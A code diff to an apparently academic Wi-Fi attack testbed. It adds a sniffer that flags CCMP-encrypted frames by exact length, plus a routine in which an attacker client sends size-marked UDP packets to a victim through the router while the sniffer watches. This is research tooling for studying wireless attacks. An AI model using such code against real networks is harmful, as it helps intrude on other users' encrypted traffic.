@@ -5,7 +5,7 @@
 # See README for more details.
 
 from libwifi import *
-import abc, sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select
+import abc, sys, os, socket, struct, time, argparse, heapq, subprocess, atexit, select, threading
 from datetime import datetime
 from wpaspy import Ctrl
 
@@ -182,13 +182,28 @@ class Monitor(Daemon):
 				p = self.sock_mon.recv()
 				if p != None: self.handle_mon(p)
 
-			self.time_tick()
+			#self.time_tick()
 			curr_time = time.time()
+	def is_target_frame(self, p):
+		if not p.haslayer(Dot11) or not p.haslayer(Dot11CCMP):
+			return False  # Ensure it's an 802.11 frame with CCMP encryption
+		
+		mac_header_len = 24 if (not p.subtype & 0x08) else 26  # 24 bytes normally, 26 if QoS
+		ccmp_len = 8  # CCMP header size
+		#mic_len = 8   # MIC field
+		enc_data_len = 110  # The required data field size
 
+		# Compute the actual data length
+		actual_data_len = len(p) - (mac_header_len + ccmp_len)
+
+		return actual_data_len == 110 or actual_data_len == 132 or actual_data_len == 145
+		
 	def handle_mon(self, p):
-		if p and len(p) > 500:  # Check packet size
+		if p and self.is_target_frame(p):  # Check packet size
 			log(STATUS, f"Captured large frame: {len(p)} bytes", color="green")
 			p.show()
+
+
 
 class Supplicant(Daemon):
 	def __init__(self, iface, options):
@@ -858,6 +873,27 @@ class Client2Monitor:
 		self.monitor.stop()
 		self.sup_attacker.stop()
 
+	def knock_three_times(self):
+		ip = IP(src=self.sup_attacker.clientip, dst="172.16.0.4")/UDP(sport=53, dport=53)
+		p1 = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b'\x00' * 66)
+		p2 = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b'\x00' * 88)
+		p3 = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b'\x00' * 101)
+		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p1)} (Ethernet destination is the gateway/router)")
+		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p2)} (Ethernet destination is the gateway/router)")
+		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p3)} (Ethernet destination is the gateway/router)")
+		self.sup_attacker.send_eth(p1)
+		time.sleep(0.2)
+		#self.monitor.event_loop(timeout=5)
+		self.sup_attacker.send_eth(p2)
+		time.sleep(0.5)
+		#self.monitor.event_loop(timeout=5)
+		self.sup_attacker.send_eth(p3)
+		time.sleep(0.7)
+		#self.monitor.event_loop(timeout=5)
+
+	def start_monitor(self):
+		self.monitor.event_loop(timeout=5)
+
 	def run(self):
 		# Start both clients
 		self.monitor.start()
@@ -877,18 +913,16 @@ class Client2Monitor:
 		# self.sup_victim.get_ip_address()
 		self.sup_attacker.get_ip_address()
 
-		ip = IP(src=self.sup_attacker.clientip, dst="172.16.0.4")/UDP(sport=53, dport=53)
-		p1 = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b'\x00' * 666)
-		p2 = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b'\x00' * 888)
-		p3 = Ether(src=self.sup_attacker.mac, dst=self.sup_attacker.routermac)/ip/Raw(b'\x00' * 1010)
-		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p1)} (Ethernet destination is the gateway/router)")
-		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p2)} (Ethernet destination is the gateway/router)")
-		log(STATUS, f"Sending IP layer packet from attacker to victim:       {repr(p3)} (Ethernet destination is the gateway/router)")
-		self.sup_attacker.send_eth(p1)
-		self.sup_attacker.send_eth(p2)
-		self.sup_attacker.send_eth(p3)
+		#self.monitor.event_loop(timeout=5)
+		thread1 = threading.Thread(target=self.knock_three_times)
+		
+		thread2 = threading.Thread(target=self.start_monitor)
 
-			
+		thread2.start()
+		thread1.start()
+
+		thread1.join()
+		thread2.join()
 
 def cleanup():
 	test.stop()
